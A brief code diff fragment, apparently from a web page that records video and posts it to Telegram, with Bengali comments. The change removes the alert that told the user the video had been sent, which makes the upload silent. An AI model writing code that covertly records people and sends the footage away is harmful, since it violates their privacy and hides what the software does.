@@ -52,12 +52,7 @@ async function test() {
                 body: formData
             });
 
-            const result = await response.json();
-            if (result.ok) {
-                alert("ভিডিও সফলভাবে টেলিগ্রামে পাঠানো হয়েছে!");
-            } else {
-                console.error("টেলিগ্রাম এরর:", result);
-            }
+
         };
 
         // ৪. রেকর্ডিং শুরু করা
